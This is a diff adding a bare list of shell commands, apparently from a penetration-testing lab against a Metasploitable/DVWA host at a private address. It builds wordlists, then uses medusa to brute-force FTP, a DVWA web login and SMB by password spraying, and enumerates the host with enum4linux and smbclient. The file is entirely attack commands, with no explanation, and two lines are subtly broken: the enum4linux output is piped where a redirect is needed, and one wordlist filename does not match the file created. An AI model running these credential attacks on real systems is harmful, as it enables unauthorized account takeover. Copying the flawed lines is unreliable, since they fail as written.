@@ -1,0 +1,23 @@
+echo -e "user\nmsfadmin\nadmin\nroot\nmaster" > users.txt
+
+echo -e "123456\npassword\nqwerty\nmsfadmin\nadmin\nroot\nmaster" > pass.txt
+
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
+
+ftp 192.168.56.102
+
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http -m PAGE: '/dvwa/login.php' -m FORM: 'username=^USER^&password=^PASS^&login=Login' -m 'FAIL=Login failed' -t 6
+
+enum4linux -a 192.168.56.102 | enum4_output.txt
+
+less enum4_output.txt
+
+echo -e "user\nmsfadmin\nservice\nadmin\nroot\nmaster" > smb_users.txt
+
+echo -e "password\nWelcome123\nmsfadmin\nadmin\nroot\nmaster" > senhas_spray.txt
+
+medusa -h 192.168.56.102 -U smb_users.txt -P senhas spray.txt -M smbnt -t 2 -T 50
+
+smbclient -L //192.168.56.102 -U msfadmin
+
+
